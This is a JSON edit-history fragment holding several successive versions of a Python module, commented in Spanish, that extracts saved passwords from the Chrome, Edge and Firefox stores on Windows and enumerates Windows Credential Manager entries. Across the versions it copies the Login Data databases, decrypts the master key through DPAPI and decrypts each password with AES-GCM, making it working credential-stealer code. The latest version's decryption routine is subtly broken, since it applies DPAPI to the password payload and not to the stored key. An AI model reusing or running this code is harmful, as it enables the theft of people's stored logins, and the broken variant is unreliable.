\"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # El resto del proceso es similar a Chrome\r\n+            temp_db = os.path.join(self.temp_dir, \"edge_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except:\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Edge: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_system_credentials(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en el sistema.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+\r\n+            CRED_TYPE_GENERIC = 1\r\n+            CRED_TYPE_DOMAIN_PASSWORD = 2\r\n+            CRED_TYPE_DOMAIN_CERTIFICATE = 3\r\n+            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4\r\n+\r\n+            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW\r\n+            CredFree = ctypes.windll.advapi32.CredFree\r\n+\r\n+            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Keyword', ctypes.wintypes.LPWSTR),\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('ValueSize', ctypes.wintypes.DWORD),\r\n+                    ('Value', ctypes.wintypes.LPBYTE)\r\n+                ]\r\n+\r\n+            class CREDENTIAL(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('Type', ctypes.wintypes.DWORD),\r\n+                    ('TargetName', ctypes.wintypes.LPWSTR),\r\n+                    ('Comment', ctypes.wintypes.LPWSTR),\r\n+                    ('LastWritten', ctypes.wintypes.FILETIME),\r\n+                    ('CredentialBlobSize', ctypes.wintypes.DWORD),\r\n+                    ('CredentialBlob', ctypes.wintypes.LPBYTE),\r\n+                    ('Persist', ctypes.wintypes.DWORD),\r\n+                    ('AttributeCount', ctypes.wintypes.DWORD),\r\n+                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),\r\n+                    ('TargetAlias', ctypes.wintypes.LPWSTR),\r\n+                    ('UserName', ctypes.wintypes.LPWSTR)\r\n+                ]\r\n+\r\n+            count = ctypes.wintypes.DWORD()\r\n+            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()\r\n+\r\n+            credentials = []\r\n+            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):\r\n+                for i in range(count.value):\r\n+                    cred = creds[i].contents\r\n+                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"target\": cred.TargetName,\r\n+                                \"username\": cred.UserName,\r\n+                                \"type\": \"Generic\" if cred.Type == CRED_TYPE_GENERIC else \"Domain\",\r\n+                                \"blob_size\": cred.CredentialBlobSize\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+\r\n+                CredFree(creds)\r\n+                \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales del sistema: {e}\")\r\n+            return []\r\n+\r\n+    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:\r\n+        \"\"\"\r\n+        Captura todas las credenciales disponibles.\r\n+        \r\n+        Returns:\r\n+            Dict con todas las credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            self.results[\"chrome\"] = self.capture_chrome_passwords()\r\n+            self.results[\"firefox\"] = self.capture_firefox_passwords()\r\n+            self.results[\"edge\"] = self.capture_edge_passwords()\r\n+            self.results[\"system\"] = self.capture_system_credentials()\r\n+            return self.results\r\n+        finally:\r\n+            self.cleanup()\r\n+\r\n+    def cleanup(self):\r\n+        \"\"\"Limpia archivos temporales.\"\"\"\r\n+        try:\r\n+            shutil.rmtree(self.temp_dir)\r\n+        except:\r\n+            pass\r\n"
                },
                {
                    "date": 1740263845122,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,320 @@\n+\"\"\"\r\n+Módulo de captura de credenciales.\r\n+Permite extraer credenciales de procesos y navegadores web.\r\n+\"\"\"\r\n+\r\n+import os\r\n+import json\r\n+import base64\r\n+import sqlite3\r\n+import shutil\r\n+import platform\r\n+import logging\r\n+import subprocess\r\n+from typing import List, Dict, Optional, Union\r\n+import tempfile\r\n+try:\r\n+    from win32crypt import CryptUnprotectData\r\n+    from Cryptodome.Cipher import AES\r\n+    WINDOWS_SUPPORT = True\r\n+except ImportError:\r\n+    WINDOWS_SUPPORT = False\r\n+    def CryptUnprotectData(*args, **kwargs):\r\n+        raise NotImplementedError(\"CryptUnprotectData no está disponible\")\r\n+import ctypes\r\n+import ctypes.wintypes\r\n+\r\n+class CredentialCapture:\r\n+    def __init__(self):\r\n+        \"\"\"Inicializa el capturador de credenciales.\"\"\"\r\n+        self.system = platform.system().lower()\r\n+        if self.system == \"windows\" and not WINDOWS_SUPPORT:\r\n+            logging.warning(\"Módulos de Windows no disponibles. La captura de credenciales estará limitada.\")\r\n+        self.temp_dir = tempfile.mkdtemp()\r\n+        self.results: Dict[str, List[Dict[str, str]]] = {\r\n+            \"chrome\": [],\r\n+            \"firefox\": [],\r\n+            \"edge\": [],\r\n+            \"system\": []\r\n+        }\r\n+\r\n+    def capture_chrome_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Chrome.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # Copiar base de datos a temporal\r\n+            temp_db = os.path.join(self.temp_dir, \"chrome_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            # Obtener clave de cifrado\r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            # Leer credenciales\r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        # Descifrar contraseña\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except Exception as e:\r\n+                        logging.debug(f\"Error descifrando credencial: {e}\")\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Chrome: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_firefox_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Firefox.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            profiles_path = os.path.join(\r\n+                os.environ[\"APPDATA\"],\r\n+                \"Mozilla\", \"Firefox\", \"Profiles\"\r\n+            )\r\n+            \r\n+            credentials = []\r\n+            for profile in os.listdir(profiles_path):\r\n+                db_path = os.path.join(profiles_path, profile, \"logins.json\")\r\n+                if not os.path.exists(db_path):\r\n+                    continue\r\n+                    \r\n+                # Copiar archivo a temporal\r\n+                temp_json = os.path.join(self.temp_dir, \"firefox_logins.json\")\r\n+                shutil.copy2(db_path, temp_json)\r\n+                \r\n+                try:\r\n+                    with open(temp_json, \"r\", encoding=\"utf-8\") as f:\r\n+                        logins = json.load(f)\r\n+                        \r\n+                    for login in logins.get(\"logins\", []):\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"url\": login.get(\"hostname\", \"\"),\r\n+                                \"username\": login.get(\"encryptedUsername\", \"\"),\r\n+                                \"password\": login.get(\"encryptedPassword\", \"\")\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+                            \r\n+                except Exception as e:\r\n+                    logging.debug(f\"Error leyendo perfil Firefox: {e}\")\r\n+                    continue\r\n+                finally:\r\n+                    try:\r\n+                        os.remove(temp_json)\r\n+                    except:\r\n+                        pass\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Firefox: {e}\")\r\n+            return []\r\n+\r\n+    def capture_edge_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Edge.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # El resto del proceso es similar a Chrome\r\n+            temp_db = os.path.join(self.temp_dir, \"edge_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except:\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Edge: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_system_credentials(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en el sistema.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+\r\n+            CRED_TYPE_GENERIC = 1\r\n+            CRED_TYPE_DOMAIN_PASSWORD = 2\r\n+            CRED_TYPE_DOMAIN_CERTIFICATE = 3\r\n+            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4\r\n+\r\n+            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW\r\n+            CredFree = ctypes.windll.advapi32.CredFree\r\n+\r\n+            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Keyword', ctypes.wintypes.LPWSTR),\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('ValueSize', ctypes.wintypes.DWORD),\r\n+                    ('Value', ctypes.wintypes.LPBYTE)\r\n+                ]\r\n+\r\n+            class CREDENTIAL(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('Type', ctypes.wintypes.DWORD),\r\n+                    ('TargetName', ctypes.wintypes.LPWSTR),\r\n+                    ('Comment', ctypes.wintypes.LPWSTR),\r\n+                    ('LastWritten', ctypes.wintypes.FILETIME),\r\n+                    ('CredentialBlobSize', ctypes.wintypes.DWORD),\r\n+                    ('CredentialBlob', ctypes.wintypes.LPBYTE),\r\n+                    ('Persist', ctypes.wintypes.DWORD),\r\n+                    ('AttributeCount', ctypes.wintypes.DWORD),\r\n+                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),\r\n+                    ('TargetAlias', ctypes.wintypes.LPWSTR),\r\n+                    ('UserName', ctypes.wintypes.LPWSTR)\r\n+                ]\r\n+\r\n+            count = ctypes.wintypes.DWORD()\r\n+            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()\r\n+\r\n+            credentials = []\r\n+            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):\r\n+                for i in range(count.value):\r\n+                    cred = creds[i].contents\r\n+                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"target\": cred.TargetName,\r\n+                                \"username\": cred.UserName,\r\n+                                \"type\": \"Generic\" if cred.Type == CRED_TYPE_GENERIC else \"Domain\",\r\n+                                \"blob_size\": cred.CredentialBlobSize\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+\r\n+                CredFree(creds)\r\n+                \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales del sistema: {e}\")\r\n+            return []\r\n+\r\n+    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:\r\n+        \"\"\"\r\n+        Captura todas las credenciales disponibles.\r\n+        \r\n+        Returns:\r\n+            Dict con todas las credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            self.results[\"chrome\"] = self.capture_chrome_passwords()\r\n+            self.results[\"firefox\"] = self.capture_firefox_passwords()\r\n+            self.results[\"edge\"] = self.capture_edge_passwords()\r\n+            self.results[\"system\"] = self.capture_system_credentials()\r\n+            return self.results\r\n+        finally:\r\n+            self.cleanup()\r\n+\r\n+    def cleanup(self):\r\n+        \"\"\"Limpia archivos temporales.\"\"\"\r\n+        try:\r\n+            shutil.rmtree(self.temp_dir)\r\n+        except:\r\n+            pass\r\n"
                },
                {
                    "date": 1740263887767,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,353 @@\n+\"\"\"\r\n+Módulo de captura de credenciales.\r\n+Permite extraer credenciales de procesos y navegadores web.\r\n+\"\"\"\r\n+\r\n+import os\r\n+import json\r\n+import base64\r\n+import sqlite3\r\n+import shutil\r\n+import platform\r\n+import logging\r\n+import subprocess\r\n+from typing import List, Dict, Optional, Union\r\n+import tempfile\r\n+import ctypes\r\n+import ctypes.wintypes\r\n+from Cryptodome.Cipher import AES\r\n+\r\n+class CryptoAPI:\r\n+    \"\"\"Clase para manejar el cifrado/descifrado usando DPAPI de Windows.\"\"\"\r\n+    def __init__(self):\r\n+        self.cryptunprotect_data = ctypes.windll.crypt32.CryptUnprotectData\r\n+        self.cryptunprotect_data.argtypes = [\r\n+            ctypes.POINTER(self._DATA_BLOB),\r\n+            ctypes.POINTER(ctypes.wintypes.LPWSTR),\r\n+            ctypes.POINTER(self._DATA_BLOB),\r\n+            ctypes.c_void_p,\r\n+            ctypes.POINTER(self._CRYPTPROTECT_PROMPTSTRUCT),\r\n+            ctypes.wintypes.DWORD,\r\n+            ctypes.POINTER(self._DATA_BLOB)\r\n+        ]\r\n+        self.cryptunprotect_data.restype = ctypes.wintypes.BOOL\r\n+        \r\n+    class _DATA_BLOB(ctypes.Structure):\r\n+        _fields_ = [\r\n+            ('cbData', ctypes.wintypes.DWORD),\r\n+            ('pbData', ctypes.POINTER(ctypes.c_char))\r\n+        ]\r\n+\r\n+    class _CRYPTPROTECT_PROMPTSTRUCT(ctypes.Structure):\r\n+        _fields_ = [\r\n+            ('cbSize', ctypes.wintypes.DWORD),\r\n+            ('dwPromptFlags', ctypes.wintypes.DWORD),\r\n+            ('hwndApp', ctypes.wintypes.HWND),\r\n+            ('szPrompt', ctypes.POINTER(ctypes.wintypes.WCHAR))\r\n+        ]\r\n+\r\n+    def unprotect(self, encrypted: bytes) -> bytes:\r\n+        \"\"\"Descifra datos usando DPAPI.\"\"\"\r\n+        input_blob = self._DATA_BLOB()\r\n+        input_blob.cbData = len(encrypted)\r\n+        input_blob.pbData = ctypes.cast(encrypted, ctypes.POINTER(ctypes.c_char))\r\n+        \r\n+        output_blob = self._DATA_BLOB()\r\n+        \r\n+        if self.cryptunprotect_data(\r\n+            ctypes.byref(input_blob),\r\n+            None,\r\n+            None,\r\n+            None,\r\n+            None,\r\n+            0,\r\n+            ctypes.byref(output_blob)\r\n+        ):\r\n+            data = ctypes.string_at(output_blob.pbData, output_blob.cbData)\r\n+            ctypes.windll.kernel32.LocalFree(output_blob.pbData)\r\n+            return data\r\n+        raise Exception(\"Failed to decrypt data\")\r\n+\r\n+class CredentialCapture:\r\n+    def __init__(self):\r\n+        \"\"\"Inicializa el capturador de credenciales.\"\"\"\r\n+        self.system = platform.system().lower()\r\n+        self.temp_dir = tempfile.mkdtemp()\r\n+        self.crypto = CryptoAPI() if self.system == \"windows\" else None\r\n+        self.results: Dict[str, List[Dict[str, str]]] = {\r\n+            \"chrome\": [],\r\n+            \"firefox\": [],\r\n+            \"edge\": [],\r\n+            \"system\": []\r\n+        }\r\n+\r\n+    def _decrypt_password(self, encrypted_pass: bytes) -> str:\r\n+        \"\"\"Descifra una contraseña usando DPAPI y AES-GCM.\"\"\"\r\n+        try:\r\n+            # Extraer el vector de inicialización y el payload\r\n+            iv = encrypted_pass[3:15]\r\n+            payload = encrypted_pass[15:]\r\n+            \r\n+            # Descifrar la clave maestra usando DPAPI\r\n+            cipher = AES.new(self.crypto.unprotect(payload), AES.MODE_GCM, iv)\r\n+            decrypted = cipher.decrypt(payload)[:-16]\r\n+            return decrypted.decode()\r\n+        except Exception as e:\r\n+            logging.debug(f\"Error descifrando contraseña: {e}\")\r\n+            return \"\"\r\n+\r\n+    def capture_chrome_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"Captura credenciales almacenadas en Chrome.\"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # Copiar base de datos a temporal\r\n+            temp_db = os.path.join(self.temp_dir, \"chrome_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        password = self._decrypt_password(encrypted_pass)\r\n+                        if password:\r\n+                            credentials.append({\r\n+                                \"url\": url,\r\n+                                \"username\": username,\r\n+                                \"password\": password\r\n+                            })\r\n+                    except Exception as e:\r\n+                        logging.debug(f\"Error procesando credencial: {e}\")\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Chrome: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_firefox_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Firefox.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            profiles_path = os.path.join(\r\n+                os.environ[\"APPDATA\"],\r\n+                \"Mozilla\", \"Firefox\", \"Profiles\"\r\n+            )\r\n+            \r\n+            credentials = []\r\n+            for profile in os.listdir(profiles_path):\r\n+                db_path = os.path.join(profiles_path, profile, \"logins.json\")\r\n+                if not os.path.exists(db_path):\r\n+                    continue\r\n+                    \r\n+                # Copiar archivo a temporal\r\n+                temp_json = os.path.join(self.temp_dir, \"firefox_logins.json\")\r\n+                shutil.copy2(db_path, temp_json)\r\n+                \r\n+                try:\r\n+                    with open(temp_json, \"r\", encoding=\"utf-8\") as f:\r\n+                        logins = json.load(f)\r\n+                        \r\n+                    for login in logins.get(\"logins\", []):\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"url\": login.get(\"hostname\", \"\"),\r\n+                                \"username\": login.get(\"encryptedUsername\", \"\"),\r\n+                                \"password\": login.get(\"encryptedPassword\", \"\")\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+                            \r\n+                except Exception as e:\r\n+                    logging.debug(f\"Error leyendo perfil Firefox: {e}\")\r\n+                    continue\r\n+                finally:\r\n+                    try:\r\n+                        os.remove(temp_json)\r\n+                    except:\r\n+                        pass\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Firefox: {e}\")\r\n+            return []\r\n+\r\n+    def capture_edge_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Edge.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # El resto del proceso es similar a Chrome\r\n+            temp_db = os.path.join(self.temp_dir, \"edge_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        password = self._decrypt_password(encrypted_pass)\r\n+                        if password:\r\n+                            credentials.append({\r\n+                                \"url\": url,\r\n+                                \"username\": username,\r\n+                                \"password\": password\r\n+                            })\r\n+                    except Exception as e:\r\n+                        logging.debug(f\"Error procesando credencial: {e}\")\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Edge: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_system_credentials(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en el sistema.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+\r\n+            CRED_TYPE_GENERIC = 1\r\n+            CRED_TYPE_DOMAIN_PASSWORD = 2\r\n+            CRED_TYPE_DOMAIN_CERTIFICATE = 3\r\n+            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4\r\n+\r\n+            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW\r\n+            CredFree = ctypes.windll.advapi32.CredFree\r\n+\r\n+            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Keyword', ctypes.wintypes.LPWSTR),\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('ValueSize', ctypes.wintypes.DWORD),\r\n+                    ('Value', ctypes.wintypes.LPBYTE)\r\n+                ]\r\n+\r\n+            class CREDENTIAL(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('Type', ctypes.wintypes.DWORD),\r\n+                    ('TargetName', ctypes.wintypes.LPWSTR),\r\n+                    ('Comment', ctypes.wintypes.LPWSTR),\r\n+                    ('LastWritten', ctypes.wintypes.FILETIME),\r\n+                    ('CredentialBlobSize', ctypes.wintypes.DWORD),\r\n+                    ('CredentialBlob', ctypes.wintypes.LPBYTE),\r\n+                    ('Persist', ctypes.wintypes.DWORD),\r\n+                    ('AttributeCount', ctypes.wintypes.DWORD),\r\n+                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),\r\n+                    ('TargetAlias', ctypes.wintypes.LPWSTR),\r\n+                    ('UserName', ctypes.wintypes.LPWSTR)\r\n+                ]\r\n+\r\n+            count = ctypes.wintypes.DWORD()\r\n+            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()\r\n+\r\n+            credentials = []\r\n+            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):\r\n+                for i in range(count.value):\r\n+                    cred = creds[i].contents\r\n+                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"target\": cred.TargetName,\r\n+                                \"username\": cred.UserName,\r\n+                                \"type\": \"Generic\" if cred.Type == CRED_TYPE_GENERIC else \"Domain\",\r\n+                                \"blob_size\": cred.CredentialBlobSize\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+\r\n+                CredFree(creds)\r\n+                \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales del sistema: {e}\")\r\n+            return []\r\n+\r\n+    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:\r\n+        \"\"\"\r\n+        Captura todas las credenciales disponibles.\r\n+        \r\n+        Returns:\r\n+            Dict con todas las credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            self.results[\"chrome\"] = self.capture_chrome_passwords()\r\n+            self.results[\"firefox\"] = self.capture_firefox_passwords()\r\n+            self.results[\"edge\"] = self.capture_edge_passwords()\r\n+            self.results[\"system\"] = self.capture_system_credentials()\r\n+            return self.results\r\n+        finally:\r\n+            self.cleanup()\r\n+\r\n+    def cleanup(self):\r\n+        \"\"\"Limpia archivos temporales.\"\"\"\r\n+        try:\r\n+            shutil.rmtree(self.temp_dir)\r\n+        except:\r\n+            pass\r\n"
                }
            ],
            "date": 1740263570777,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de captura de credenciales.\r\nPermite extraer credenciales de procesos y navegadores web.\r\n\"\"\"\r\n\r\nimport os\r\nimport json\r\nimport base64\r\nimport sqlite3\r\nimport shutil\r\nimport platform\r\nimport logging\r\nimport subprocess\r\nfrom typing import List, Dict, Optional, Union\r\nimport tempfile\r\nimport win32crypt\r\nfrom Cryptodome.Cipher import AES\r\nimport ctypes\r\nimport ctypes.wintypes\r\n\r\nclass CredentialCapture:\r\n    def __init__(self):\r\n        \"\"\"Inicializa el capturador de credenciales.\"\"\"\r\n        self.system = platform.system().lower()\r\n        self.temp_dir = tempfile.mkdtemp()\r\n        self.results: Dict[str, List[Dict[str, str]]] = {\r\n            \"chrome\": [],\r\n            \"firefox\": [],\r\n            \"edge\": [],\r\n            \"system\": []\r\n        }\r\n\r\n    def capture_chrome_passwords(self) -> List[Dict[str, str]]:\r\n        \"\"\"\r\n        Captura credenciales almacenadas en Chrome.\r\n        \r\n        Returns:\r\n            Lista de credenciales encontradas\r\n        